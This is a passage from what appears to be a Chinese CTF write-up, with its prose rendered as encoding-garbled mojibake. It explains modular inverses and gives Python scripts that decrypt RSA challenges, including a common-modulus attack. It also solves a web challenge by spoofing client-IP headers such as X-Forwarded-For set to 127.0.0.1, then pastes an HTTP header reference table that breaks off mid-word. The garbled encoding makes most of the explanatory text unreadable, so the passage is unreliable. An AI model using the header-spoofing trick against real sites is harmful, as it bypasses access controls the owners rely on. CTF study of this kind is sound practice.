ä½™æ•°1&#x3D;3-2*1æ­¤æ—¶å‘ç°é™¤æ•°2(åŸæ¥çš„ä½™æ•°)ä¸ä½™æ•°1å¯ä»¥æ•´é™¤ï¼Œåœæ­¢é™¤æ³•2æ˜¯ç”±ç¬¬ä¸€æ­¥æ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å€’æ¨å›å»1&#x3D;3-2*1&#x3D;3-(5-3*1)*1&#x3D;3-5+3*1&#x3D;3*2-5 å³3*2-5&#x3D;1ç­‰å·ä¸¤ç«¯åŒä¹˜ä»¥2828*2*3+28*(-1)*5&#x3D;2856*3+(-28)*5&#x3D;28x&#x3D;56 y&#x3D;-28 ç‰¹è§£ åŒæ ·æˆ‘ä»¬ä¹Ÿèƒ½æ±‚å‡ºæ¨¡é€†å…ƒ 12345678é¦–å…ˆå¯¹ä½™æ•°è¿›è¡Œè¾—è½¬ç›¸é™¤ï¼šN &#x3D; A * a0 + r0A &#x3D; r0 * a1 + r1r0 &#x3D; r1 * a2 + r2r1 &#x3D; r2 * a3 + r3â€¦rn-2 &#x3D; rn-1 * an + rnrn-1 &#x3D; rn * an+1 + 0 å¯¹ä¸Šé¢çš„å•†æ•°é€†å‘æ’åˆ—ï¼ˆä¸å«ä½™æ•°ä¸º0çš„å•†æ•°ï¼‰ï¼š å…¶ä¸­ï¼šb-1 = 1b0 = anbi = an-1 * bi-1 + bi-2å¦‚æœnä¸ºå¥‡æ•°ï¼ˆå³å•†ä¸ªæ•°ä¸ºå¶æ•°ï¼‰ï¼Œåˆ™bnå³ä¸ºæ‰€æ±‚çš„é€†å…ƒBï¼›å¦‚æœnä¸ºå¶æ•°ï¼ˆå³å•†ä¸ªæ•°ä¸ºå¥‡æ•°ï¼‰ï¼Œåˆ™N-bnå³ä¸ºæ‰€æ±‚çš„é€†å…ƒBã€‚ ä¸¾ä¸¤ä¸ªä¾‹å­ï¼š 12345678æ±‚61å…³äºæ¨¡105çš„é€†ã€‚å…ˆå¯¹ä½™æ•°è¾—è½¬ç›¸é™¤ï¼š105 &#x3D; 61 * 1 + 4461 &#x3D; 44 * 1 + 1744 &#x3D; 17 * 2 + 1017 &#x3D; 10 * 1 + 710 &#x3D; 7 * 1 + 37 &#x3D; 3 * 2 + 13 &#x3D; 1 * 3 + 0 å°†å•†æ•°é€†åºæ’åˆ—ï¼š ç”±äºå•†çš„ä¸ªæ•°ä¸ºå¶æ•°ï¼Œå› æ­¤31å³ä¸º61å…³äºæ¨¡105çš„é€†å…ƒã€‚(31 * 61 = 105 * 18 + 1) 1234567æ±‚31å…³äºæ¨¡105çš„é€†ï¼Œå…ˆå¯¹ä½™æ•°è¾—è½¬ç›¸é™¤ï¼š105 &#x3D; 31 * 3 + 1231 &#x3D; 12 * 2 + 712 &#x3D; 7 * 1 + 57 &#x3D; 5 * 1 + 25 &#x3D; 2 * 2 + 12 &#x3D; 1 * 2 + 0 å°†å•†æ•°é€†åºæ’åˆ—ï¼š ç”±äºå•†çš„ä¸ªæ•°ä¸ºå¥‡æ•°ï¼Œå› æ­¤105-44=61å³ä¸º31å…³äº105çš„é€†å…ƒ çŸ¥é“æ¨¡é€†å…ƒæ€æœ«æ±‚å¾—äº†ï¼Œç„¶åæˆ‘ä»¬å°±è¿›è¡ŒåŠ å¯†å—ï¼Œmæ˜¯æ˜æ–‡ï¼Œcæ˜¯å¯†æ–‡ 1m^e â‰¡ c (mod N) è§£å¯† 1c^d â‰¡ m (mod N) å†å›åˆ°è¿™é“é¢˜ ç”±p+qå’Œp-qæˆ‘ä»¬èƒ½ç®—å‡ºp,qï¼Œå³N=p*qä¹ŸçŸ¥é“äº†ï¼Œcæ˜¯å¯†æ–‡ï¼Œeä¹ŸçŸ¥é“ç›´æ¥ç”¨gmpy2å°±èƒ½ç®—å‡ºdï¼Œexp: 1234567891011import gmpy2e=8817541paq=16321432012361424715999482612620733350248842171519096058290401228839812649586719552027326066167539574579803995633219307746250179205827394262822225496256560psq=-762917520212563308246814613407392836711488448360655007080799273105995688894593100287666509669227799508891920589926279868282905643495952401909422097272782c=50489857463808300926430257877498323881188812748322681976260520202074367690898181749018527743434038118959830923111311450056657583556281704259092120255347994094472328493911537046586917971842411521641278869273145554989991259437124572940334561139020989426695807874811943663373081092453657052151887455784297691646p = (paq+psq)//2q = (paq-psq)//2d = gmpy2.invert(e, (p-1)*(q-1))m = pow(c, d, p*q)print(m) ä¹‹åè½¬16è¿›åˆ¶è½¬å­—ç¬¦ä¸²å°±è¡Œ gmpy2å®‰è£…å‚è€ƒï¼šhttps://www.cnblogs.com/threesoil/p/9926669.html RSA1å’Œç¬¬ä¸€é¢˜å·®ä¸å¤š æœ¬é¢˜æ¯è®¿é—®ä¸€æ¬¡éƒ½ä¼šç»™ä¸€ç»„éšæœºçš„eå’Œcï¼Œä½†æ˜¯p^2+q^2å’Œp-qä¸å˜ï¼Œå› æ­¤å¯ä»¥è€ƒè™‘å…±æ¨¡æ”»å‡» 1234567p^2+q^2&#x3D;233267952291859505039783652916196820549830655854017481630358970687296150605497287567221180374924125322298582680891700281813911894392167573300640690548821752679776824359493927916641019722671365040868493597644196114187232764555313925484030012559195525765269481240206756265081919013526886083861070280044423277050p-q&#x3D;-5768290924819924200771763039115328282726881252181364451258071886264423429200083031925129093846564595799325371731199564895705667053253727806125240485496428c&#x3D;87567700255805446580688569086348162935993913860449220595864885191176757127427511444244078884207896008178494024025285025508575080281587835133751089187296800829716128794411892433058027899034063381868520639785769819574614982230602956229984725797909585660127484706025719219624130414557402851436473586137081066463flag&#x3D;?????? exp: 12345678910111213141516171819202122232425262728293031323334from gmpy2 import invertdef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)c1 = 87567700255805446580688569086348162935993913860449220595864885191176757127427511444244078884207896008178494024025285025508575080281587835133751089187296800829716128794411892433058027899034063381868520639785769819574614982230602956229984725797909585660127484706025719219624130414557402851436473586137081066463e1 = 11398291c2 = 18705967865609703350505203897353013349572268163704731296055745391917469960518910212955107755812854024901962046413249126535525965403804342347153196889210756001085291251582862612150330490682927199414305833505087697733874760767084138461692058648555896587248051209761491427866198455080624903527433009258377083135e2 = 11511989A = 233267952291859505039783652916196820549830655854017481630358970687296150605497287567221180374924125322298582680891700281813911894392167573300640690548821752679776824359493927916641019722671365040868493597644196114187232764555313925484030012559195525765269481240206756265081919013526886083861070280044423277050B = -5768290924819924200771763039115328282726881252181364451258071886264423429200083031925129093846564595799325371731199564895705667053253727806125240485496428n = (A-B**2)//2# print ns = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = invert(c1, n)elif s2&lt;0: s2 = - s2 c2 = invert(c2, n)m = pow(c1,s1,n)*pow(c2,s2,n) % nprint(m) WEBå‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€è¿™é¢˜çœŸçš„å¾ˆã€‚ã€‚ã€‚ å°è¯•adminï¼Œæç¤ºä¸æ˜¯admin éšä¾¿ç™»ä¸ªè´¦å·ï¼ŒæŠ“åŒ…ï¼Œåœ¨htmlç»“å°¾å‘ç°L0g1n.php è®¿é—®å‘ç°ä¸€ç¯å¥—ä¸€ç¯ï¼Œæœ€åæ„é€ å°±èƒ½å¾—åˆ°flagçš„base64ç¼–ç å½¢å¼äº† ä¼ªé€ ip: 123456789X-Forwarded-For:127.0.0.1X-Forwarded-Host:127.0.0.1X-Client-IP:127.0.0.1X-remote-IP:127.0.0.1X-remote-addr:127.0.0.1True-Client-IP:127.0.0.1X-Client-IP:127.0.0.1Client-IP:127.0.0.1X-Real-IP:127.0.0.1 è®°ä¸€ä¸‹httpçš„å¸¸è§å­—æ®µï¼š è¯·æ±‚å­—æ®µ åè®®å¤´å­—æ®µå è¯´æ˜ ç¤ºä¾‹ çŠ¶æ€ Accept èƒ½å¤Ÿæ¥å—çš„å›åº”å†…å®¹ç±»å‹ï¼ˆContent-Typesï¼‰ã€‚å‚è§å†…å®¹åå•†ã€‚ Accept: text/plain å¸¸è®¾ Accept-Charset èƒ½å¤Ÿæ¥å—çš„å­—ç¬¦é›† Accept-Charset: utf-8 å¸¸è®¾ Accept-Encoding èƒ½å¤Ÿæ¥å—çš„ç¼–ç æ–¹å¼åˆ—è¡¨ã€‚å‚è€ƒHTTPå‹ç¼©ã€‚ Accept-Encoding: gzip, deflate å¸¸è®¾ Accept-Language èƒ½å¤Ÿæ¥å—çš„å›åº”å†…å®¹çš„è‡ªç„¶è¯­è¨€åˆ—è¡¨ã€‚å‚è€ƒ å†…å®¹åå•† ã€‚ Accept-Language: en-US å¸¸è®¾ Accept-Datetime èƒ½å¤Ÿæ¥å—çš„æŒ‰ç…§æ—¶é—´æ¥è¡¨ç¤ºçš„ç‰ˆæœ¬ Accept-Datetime: Thu, 31 May 2007 20:35:00 GMT ä¸´æ—¶ Authorization ç”¨äºè¶…æ–‡æœ¬ä¼ è¾“åè®®çš„è®¤è¯çš„è®¤è¯ä¿¡æ¯ Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== å¸¸è®¾ Cache-Control ç”¨æ¥æŒ‡å®šåœ¨è¿™æ¬¡çš„è¯·æ±‚/å“åº”é“¾ä¸­çš„æ‰€æœ‰ç¼“å­˜æœºåˆ¶ éƒ½å¿…é¡» éµå®ˆçš„æŒ‡ä»¤ Cache-Control: no-cache å¸¸è®¾ Connection è¯¥æµè§ˆå™¨æƒ³è¦ä¼˜å…ˆä½¿ç”¨çš„è¿æ¥ç±»å‹[8] Connection: keep-alive``Connection: Upgrade å¸¸è®¾ Cookie ä¹‹å‰ç”±æœåŠ¡å™¨é€šè¿‡ Set- Cookie ï¼ˆä¸‹æ–‡è¯¦è¿°ï¼‰å‘é€çš„ä¸€ä¸ª è¶…æ–‡æœ¬ä¼ è¾“åè®®Cookie Cookie: $Version=1; Skin=new; å¸¸è®¾: æ ‡å‡† Content-Length ä»¥ å…«ä½å­—èŠ‚æ•°ç»„ ï¼ˆ8ä½çš„å­—èŠ‚ï¼‰è¡¨ç¤ºçš„è¯·æ±‚ä½“çš„é•¿åº¦ Content-Length: 348 å¸¸è®¾ Content-MD5 è¯·æ±‚ä½“çš„å†…å®¹çš„äºŒè¿›åˆ¶ MD5 æ•£åˆ—å€¼ï¼Œä»¥ Base64 ç¼–ç çš„ç»“æœ Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ== è¿‡æ—¶çš„[9] Content-Type è¯·æ±‚ä½“çš„ å¤šåª’ä½“ç±»å‹ ï¼ˆç”¨äºPOSTå’ŒPUTè¯·æ±‚ä¸­ï¼‰ Content-Type: application/x-www-form-urlencoded å¸¸è®¾ Date å‘é€è¯¥æ¶ˆæ¯çš„æ—¥æœŸå’Œæ—¶é—´(æŒ‰ç…§ RFC 7231 ä¸­å®šä¹‰çš„â€è¶…æ–‡æœ¬ä¼ è¾“åè®®æ—¥æœŸâ€æ ¼å¼æ¥å‘é€) Date: Tue, 15 Nov 1994 08:12:31 GMT å¸¸è®¾ Expect è¡¨æ˜å®¢æˆ·ç«¯è¦æ±‚æœåŠ¡å™¨åšå‡ºç‰¹å®šçš„è¡Œä¸º Expect: 100-continue å¸¸è®¾ From å‘èµ·æ­¤è¯·æ±‚çš„ç”¨æˆ·çš„é‚®ä»¶åœ°å€ From: user@example.com å¸¸è®¾ Host æœåŠ¡å™¨çš„åŸŸå(ç”¨äºè™šæ‹Ÿä¸»æœº )ï¼Œä»¥åŠæœåŠ¡å™¨æ‰€ç›‘å¬çš„ä¼ è¾“æ§åˆ¶åè®®ç«¯å£å·ã€‚å¦‚æœæ‰€è¯·æ±‚çš„ç«¯å£æ˜¯å¯¹åº”çš„æœåŠ¡çš„æ ‡å‡†ç«¯å£ï¼Œåˆ™ç«¯å£å·å¯è¢«çœç•¥ã€‚[10] è‡ªè¶…æ–‡ä»¶ä¼ è¾“åè®®ç‰ˆæœ¬1.1ï¼ˆHTTP/1.1ï¼‰å¼€å§‹ä¾¿æ˜¯å¿…éœ€å­—æ®µã€‚ Host: en.wikipedia.org:80``Host: en.wikipedia.org å¸¸è®¾ If-Match ä»…å½“å®¢æˆ·ç«¯æä¾›çš„å®ä½“ä¸æœåŠ¡å™¨ä¸Šå¯¹åº”çš„å®ä½“ç›¸åŒ¹é…æ—¶ï¼Œæ‰è¿›è¡Œå¯¹åº”çš„æ“ä½œã€‚ä¸»è¦ä½œç”¨æ—¶ï¼Œç”¨ä½œåƒ PUT è¿™æ ·çš„æ–¹æ³•ä¸­ï¼Œä»…å½“ä»ç”¨æˆ·ä¸Šæ¬¡æ›´æ–°æŸä¸ªèµ„æºä»¥æ¥ï¼Œè¯¥èµ„æºæœªè¢«ä¿®æ”¹çš„æƒ…å†µä¸‹ï¼Œæ‰æ›´æ–°è¯¥èµ„æºã€‚ If-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot; å¸¸è®¾ If-Modified-Since å…è®¸åœ¨å¯¹åº”çš„å†…å®¹æœªè¢«ä¿®æ”¹çš„æƒ…å†µä¸‹è¿”å›304æœªä¿®æ”¹ï¼ˆ 304 Not Modified ï¼‰ If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT å¸¸è®¾ If-None-Match å…è®¸åœ¨å¯¹åº”çš„å†…å®¹æœªè¢«ä¿®æ”¹çš„æƒ…å†µä¸‹è¿”å›304æœªä¿®æ”¹ï¼ˆ 304 Not Modified ï¼‰ï¼Œå‚è€ƒ è¶…æ–‡æœ¬ä¼ è¾“åè®® çš„å®ä½“æ ‡è®° If-None-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot; å¸¸è®¾ If-Range å¦‚æœè¯¥å®ä½“æœªè¢«ä¿®æ”¹è¿‡ï¼Œåˆ™å‘æˆ‘å‘é€æˆ‘æ‰€ç¼ºå°‘çš„é‚£ä¸€ä¸ªæˆ–å¤šä¸ªéƒ¨åˆ†ï¼›å¦åˆ™ï¼Œå‘é€æ•´ä¸ªæ–°çš„å®ä½“ If-Range: &quot;737060cd8c284d8af7ad3082f209582d&quot; å¸¸è®¾ If-Unmodified-Since ä»…å½“è¯¥å®ä½“è‡ªæŸä¸ªç‰¹å®šæ—¶é—´å·²æ¥æœªè¢«ä¿®æ”¹çš„æƒ…å†µä¸‹ï¼Œæ‰å‘é€å›åº”ã€‚ If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 GMT å¸¸è®¾ Max-Forwards é™åˆ¶è¯¥æ¶ˆæ¯å¯è¢«ä»£ç†åŠç½‘å…³è½¬å‘çš„æ¬¡æ•°ã€‚ Max-Forwards: 10 å¸¸è®¾ Origin å‘èµ·ä¸€ä¸ªé’ˆå¯¹ è·¨æ¥æºèµ„æºå…±äº« çš„è¯·æ±‚ï¼ˆè¦æ±‚æœåŠ¡å™¨åœ¨å›åº”ä¸­åŠ å…¥ä¸€ä¸ªâ€˜è®¿é—®æ§åˆ¶-å…è®¸æ¥æºâ€™ï¼ˆâ€™Access-Control-Allow-Originâ€™ï¼‰å­—æ®µï¼‰ã€‚ Origin: http://www.example-social-network.com å¸¸è®¾: æ ‡å‡† Pragma ä¸å…·ä½“çš„å®ç°ç›¸å…³ï¼Œè¿™äº›å­—æ®µå¯èƒ½åœ¨è¯·æ±‚/å›åº”é“¾ä¸­çš„ä»»ä½•æ—¶å€™äº§ç”Ÿå¤šç§æ•ˆæœã€‚ Pragma: no-cache å¸¸è®¾ä½†ä¸å¸¸ç”¨ Proxy-Authorization ç”¨æ¥å‘ä»£ç†è¿›è¡Œè®¤è¯çš„è®¤è¯ä¿¡æ¯ã€‚ Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== å¸¸è®¾ Range ä»…è¯·æ±‚æŸä¸ªå®ä½“çš„ä¸€éƒ¨åˆ†ã€‚å­—èŠ‚åç§»ä»¥0å¼€å§‹ã€‚å‚è§å­—èŠ‚æœåŠ¡ã€‚ Range: bytes=500-999 å¸¸è®¾ Referer [*sic*] [11] è¡¨ç¤ºæµè§ˆå™¨æ‰€è®¿é—®çš„å‰ä¸€ä¸ªé¡µé¢ï¼Œæ­£æ˜¯é‚£ä¸ªé¡µé¢ä¸Šçš„æŸä¸ªé“¾æ¥å°†æµè§ˆå™¨å¸¦åˆ°äº†å½“å‰æ‰€è¯·æ±‚çš„è¿™ä¸ªé¡µé¢ã€‚ Referer: http://en.wikipedia.org/wiki/Main_Page å¸¸è®¾ TE æµè§ˆå™¨é¢„æœŸæ¥å—çš„ä¼ è¾“ç¼–ç æ–¹å¼ï¼šå¯ä½¿ç”¨å›åº”åè®®å¤´ Transfer-Encoding å­—æ®µä¸­çš„å€¼ï¼›å¦å¤–è¿˜å¯ç”¨â€trailersâ€ï¼ˆä¸â€åˆ†å— â€œä¼ è¾“æ–¹å¼ç›¸å…³ï¼‰è¿™ä¸ªå€¼æ¥è¡¨æ˜æµè§ˆå™¨å¸Œæœ›åœ¨æœ€åä¸€ä¸ªå°ºå¯¸ä¸º0çš„å—ä¹‹åè¿˜æ¥æ”¶åˆ°ä¸€äº›é¢å¤–çš„å­—æ®µã€‚ TE: trailers, deflate å¸¸è®¾ User-Agent æµè§ˆå™¨çš„æµè§ˆå™¨èº«ä»½æ ‡è¯†å­—ç¬¦ä¸² User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/21.0 å¸¸è®¾ Upgrade è¦æ±‚æœåŠ¡å™¨å‡çº§åˆ°å¦ä¸€ä¸ªåè®®ã€‚ Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11 å¸¸è®¾ Via å‘æœåŠ¡å™¨å‘ŠçŸ¥ï¼Œè¿™ä¸ªè¯·æ±‚æ˜¯ç”±å“ªäº›ä»£ç†å‘å‡ºçš„ã€‚ Via: 1.0 fred, 1.1 example.com (Apache/1.1) å¸¸è®¾ Warning ä¸€ä¸ªä¸€èˆ¬æ€§çš„è­¦å‘Šï¼Œå‘ŠçŸ¥ï¼Œåœ¨å®ä½“å†…å®¹ä½“ä¸­å¯èƒ½å­˜åœ¨é”™è¯¯ã€‚ Warning: 199 Miscellaneous warning å¸¸è®¾ å¸¸è§çš„éæ ‡å‡†è¯·æ±‚å­—æ®µ å­—æ®µå è¯´æ˜ ç¤ºä¾‹ X-Requested-With ä¸»è¦ç”¨äºæ ‡è¯† Ajax åŠå¯æ‰©å±•æ ‡è®°è¯­è¨€ è¯·æ±‚ã€‚å¤§éƒ¨åˆ†çš„JavaScriptæ¡†æ¶ä¼šå‘é€è¿™ä¸ªå­—æ®µï¼Œä¸”å°†å…¶å€¼è®¾ç½®ä¸º XMLHttpRequest X-Requested-With: XMLHttpRequest DNT[12] è¯·æ±‚æŸä¸ªç½‘é¡µåº”ç”¨ç¨‹åºåœæ­¢è·Ÿè¸ªæŸä¸ªç”¨æˆ·ã€‚åœ¨ç«ç‹æµè§ˆå™¨ä¸­ï¼Œç›¸å½“äºX-Do-Not-Trackåè®®å¤´å­—æ®µï¼ˆè‡ª Firefox/4.0 Beta 11 ç‰ˆå¼€å§‹æ”¯æŒï¼‰ã€‚Safari å’Œ Internet Explorer 9 ä¹Ÿæ”¯æŒè¿™ä¸ªå­—æ®µã€‚2011å¹´3æœˆ7æ—¥ï¼Œè‰æ¡ˆæäº¤IETFã€‚[13] ä¸‡ç»´ç½‘åä¼š çš„è·Ÿè¸ªä¿æŠ¤å·¥ä½œç»„æ­£åœ¨å°±æ­¤åˆ¶ä½œä¸€é¡¹è§„èŒƒã€‚[14] DNT: 1 (DNTå¯ç”¨)``DNT: 0 (DNTè¢«ç¦ç”¨) X-Forwarded-For[15] ä¸€ä¸ªäº‹å®æ ‡å‡† ï¼Œç”¨äºæ ‡è¯†æŸä¸ªé€šè¿‡è¶…æ–‡æœ¬ä¼ è¾“åè®®ä»£ç†æˆ–è´Ÿè½½å‡è¡¡è¿æ¥åˆ°æŸä¸ªç½‘é¡µæœåŠ¡å™¨çš„å®¢æˆ·ç«¯çš„åŸå§‹äº’è”ç½‘åœ°å€ X-Forwarded-For: client1, proxy1, proxy2``X-Forwarded-For: 129.78.138.66, 129.78.64.103 X-Forwarded-Host[16] ä¸€ä¸ªäº‹å®æ ‡å‡† ï¼Œç”¨äºè¯†åˆ«å®¢æˆ·ç«¯åŸæœ¬å‘å‡ºçš„ Host è¯·æ±‚å¤´éƒ¨[17]ã€‚ X-Forwarded-Host: en.wikipedia.org:80``X-Forwarded-Host: en.wikipedia.org X-Forwarded-Proto[18] ä¸€ä¸ªäº‹å®æ ‡å‡†ï¼Œç”¨äºæ ‡è¯†æŸä¸ªè¶…æ–‡æœ¬ä¼ è¾“åè®®è¯·æ±‚æœ€åˆæ‰€ä½¿ç”¨çš„åè®®ã€‚[19] X-Forwarded-Proto: https Front-End-Https[20] è¢«å¾®è½¯çš„æœåŠ¡å™¨å’Œè´Ÿè½½å‡è¡¡å™¨æ‰€ä½¿ç”¨çš„éæ ‡å‡†å¤´éƒ¨å­—æ®µã€‚ Front-End-Https: on X-Http-Method-Override[21] è¯·æ±‚æŸä¸ªç½‘é¡µåº”ç”¨ç¨‹åºä½¿ç”¨è¯¥åè®®å¤´å­—æ®µä¸­æŒ‡å®šçš„æ–¹æ³•ï¼ˆä¸€èˆ¬æ˜¯PUTæˆ–DELETEï¼‰æ¥è¦†ç›–æ‰åœ¨è¯·æ±‚ä¸­æ‰€æŒ‡å®šçš„æ–¹æ³•ï¼ˆä¸€èˆ¬æ˜¯POSTï¼‰ã€‚å½“æŸä¸ªæµè§ˆå™¨æˆ–é˜²ç«å¢™é˜»æ­¢ç›´æ¥å‘é€PUT æˆ–DELETE æ–¹æ³•æ—¶ï¼ˆæ³¨æ„ï¼Œè¿™å¯èƒ½æ˜¯å› ä¸ºè½¯ä»¶ä¸­çš„æŸä¸ªæ¼æ´ï¼Œå› è€Œéœ€è¦ä¿®å¤ï¼Œä¹Ÿå¯èƒ½æ˜¯å› ä¸ºæŸä¸ªé…ç½®é€‰é¡¹å°±æ˜¯å¦‚æ­¤è¦æ±‚çš„ï¼Œå› è€Œä¸åº”å½“è®¾æ³•ç»•è¿‡ï¼‰ï¼Œå¯ä½¿ç”¨è¿™ç§æ–¹å¼ã€‚ X-HTTP-Method-Override: DELETE X-ATT-DeviceId[22] ä½¿æœåŠ¡å™¨æ›´å®¹æ˜“è§£è¯»AT&amp;Tè®¾å¤‡User-Agentå­—æ®µä¸­å¸¸è§çš„è®¾å¤‡å‹å·ã€å›ºä»¶ä¿¡æ¯ã€‚ X-Att-Deviceid: GT-P7320/P7320XXLPG X-Wap-Profile[23] é“¾æ¥åˆ°äº’è”ç½‘ä¸Šçš„ä¸€ä¸ªXMLæ–‡ä»¶ï¼Œå…¶å®Œæ•´ã€ä»”ç»†åœ°æè¿°äº†æ­£åœ¨è¿æ¥çš„è®¾å¤‡ã€‚å³ä¾§ä»¥ä¸ºAT&amp;T Samsung Galaxy S2æä¾›çš„XMLæ–‡ä»¶ä¸ºä¾‹ã€‚ x-wap-profile: http://wap.samsungmobile.com/uaprof/SGH-I777.xml Proxy-Connection[24] è¯¥å­—æ®µæºäºæ—©æœŸè¶…æ–‡æœ¬ä¼ è¾“åè®®ç‰ˆæœ¬å®ç°ä¸­çš„é”™è¯¯ã€‚ä¸æ ‡å‡†çš„è¿æ¥ï¼ˆConnectionï¼‰å­—æ®µçš„åŠŸèƒ½å®Œå…¨ç›¸åŒã€‚ Proxy-Connection: keep-alive X-Csrf-Token[25] ç”¨äºé˜²æ­¢ è·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚ è¾…åŠ©ç”¨çš„å¤´éƒ¨æœ‰ X-CSRFToken[26] æˆ– X-XSRF-TOKEN[27] X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql å›åº”å­—æ®µ å­—æ®µå è¯´æ˜ ä¾‹å­ çŠ¶æ€ Access-Control-Allow-Origin æŒ‡å®šå“ªäº›ç½‘ç«™å¯å‚ä¸åˆ°è·¨æ¥æºèµ„æºå…±äº«è¿‡ç¨‹ä¸­ Access-Control-Allow-Origin: * ä¸´æ—¶ Accept-Patch[28] æŒ‡å®šæœåŠ¡å™¨æ”¯æŒçš„æ–‡ä»¶æ ¼å¼ç±»å‹ã€‚ Accept-Patch: text/example;charset=utf-8 å¸¸è®¾ Accept-Ranges è¿™ä¸ªæœåŠ¡å™¨æ”¯æŒå“ªäº›ç§ç±»çš„éƒ¨åˆ†å†…å®¹èŒƒå›´ Accept-Ranges: bytes å¸¸è®¾ Age è¿™ä¸ªå¯¹è±¡åœ¨ä»£ç†ç¼“å­˜ä¸­å­˜åœ¨çš„æ—¶é—´ï¼Œä»¥ç§’ä¸ºå•ä½ Age: 12 å¸¸è®¾ Allow å¯¹äºç‰¹å®šèµ„æºæœ‰æ•ˆçš„åŠ¨ä½œã€‚é’ˆå¯¹HTTP/405è¿™ä¸€é”™è¯¯ä»£ç è€Œä½¿ç”¨ Allow: GET, HEAD å¸¸è®¾ Cache-Control å‘ä»æœåŠ¡å™¨ç›´åˆ°å®¢æˆ·ç«¯åœ¨å†…çš„æ‰€æœ‰ç¼“å­˜æœºåˆ¶å‘ŠçŸ¥ï¼Œå®ƒä»¬æ˜¯å¦å¯ä»¥ç¼“å­˜è¿™ä¸ªå¯¹è±¡ã€‚å…¶å•ä½ä¸ºç§’ Cache-Control: max-age=3600 å¸¸è®¾ Connection é’ˆå¯¹è¯¥è¿æ¥æ‰€é¢„æœŸçš„é€‰é¡¹[8] Connection: close å¸¸è®¾ Content-Disposition[29] ä¸€ä¸ªå¯ä»¥è®©å®¢æˆ·ç«¯ä¸‹è½½æ–‡ä»¶å¹¶å»ºè®®æ–‡ä»¶åçš„å¤´éƒ¨ã€‚æ–‡ä»¶åéœ€è¦ç”¨åŒå¼•å·åŒ…è£¹ã€‚ Content-Disposition: attachment; filename=&quot;fname.ext&quot; å¸¸è®¾ Content-Encoding åœ¨æ•°æ®ä¸Šä½¿ç”¨çš„ç¼–ç ç±»å‹ã€‚å‚è€ƒ è¶…æ–‡æœ¬ä¼ è¾“åè®®å‹ç¼© ã€‚ Content-Encoding: gzip å¸¸è®¾ Content-Language å†…å®¹æ‰€ä½¿ç”¨çš„è¯­è¨€[30] Content-Language: da å¸¸è®¾ Content-Length å›åº”æ¶ˆæ¯ä½“çš„é•¿åº¦ï¼Œä»¥ å­—èŠ‚ ï¼ˆ8ä½ä¸ºä¸€å­—èŠ‚ï¼‰ä¸ºå•ä½ Content-Length: 348 å¸¸è®¾ Content-Location æ‰€è¿”å›çš„æ•°æ®çš„ä¸€ä¸ªå€™é€‰ä½ç½® Content-Location: /index.htm å¸¸è®¾ Content-MD5 å›åº”å†…å®¹çš„äºŒè¿›åˆ¶ MD5 æ•£åˆ—ï¼Œä»¥ Base64 æ–¹å¼ç¼–ç  Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ== è¿‡æ—¶çš„[31] Content-Range è¿™æ¡éƒ¨åˆ†æ¶ˆæ¯æ˜¯å±äºæŸæ¡å®Œæ•´æ¶ˆæ¯çš„å“ªä¸ªéƒ¨åˆ† Content-Range: bytes 21010-47021/47022 å¸¸è®¾ Content-Type å½“å‰å†…å®¹çš„MIMEç±»å‹ Content-Type: text/html; charset=utf-8 å¸¸è®¾ Date æ­¤æ¡æ¶ˆæ¯è¢«å‘é€æ—¶çš„æ—¥æœŸå’Œæ—¶é—´(æŒ‰ç…§ RFC 7231 ä¸­å®šä¹‰çš„â€œè¶…æ–‡æœ¬ä¼ è¾“åè®®æ—¥æœŸâ€æ ¼å¼æ¥è¡¨ç¤º) Date: Tue, 15 Nov 1994 08:12:31 GMT å¸¸è®¾ ETag å¯¹äºæŸä¸ªèµ„æºçš„æŸä¸ªç‰¹å®šç‰ˆæœ¬çš„ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ª æ¶ˆæ¯æ•£åˆ— ETag: &quot;737060cd8c284d8af7ad3082f209582d&quot; å¸¸è®¾ Expires æŒ‡å®šä¸€ä¸ªæ—¥æœŸ/æ—¶é—´ï¼Œè¶…è¿‡è¯¥æ—¶é—´åˆ™è®¤ä¸ºæ­¤å›åº”å·²ç»è¿‡æœŸ Expires: Thu, 01 Dec 1994 16:00:00 GMT å¸¸è®¾: æ ‡å‡† Last-Modified æ‰€è¯·æ±‚çš„å¯¹è±¡çš„æœ€åä¿®æ”¹æ—¥æœŸ(æŒ‰ç…§ RFC 7231 ä¸­å®šä¹‰çš„â€œè¶…æ–‡æœ¬ä¼ è¾“åè®®æ—¥æœŸâ€æ ¼å¼æ¥è¡¨ç¤º) Last-Modified: Tue, 15 Nov 1994 12:45:26 GMT å¸¸è®¾ Link ç”¨æ¥è¡¨è¾¾ä¸å¦ä¸€ä¸ªèµ„æºä¹‹é—´çš„ç±»å‹å…³ç³»ï¼Œæ­¤å¤„æ‰€è¯´çš„ç±»å‹å…³ç³»æ˜¯åœ¨ RFC 5988 ä¸­å®šä¹‰çš„ Link: ; rel=&quot;alternate&quot;[32] å¸¸è®¾ Location ç”¨æ¥ è¿›è¡Œé‡å®šå‘ï¼Œæˆ–è€…åœ¨åˆ›å»ºäº†æŸä¸ªæ–°èµ„æºæ—¶ä½¿ç”¨ã€‚ Location: http://www.w3.org/pub/WWW/People.html å¸¸è®¾ P3P ç”¨äºæ”¯æŒè®¾ç½®P3Pç­–ç•¥ï¼Œæ ‡å‡†æ 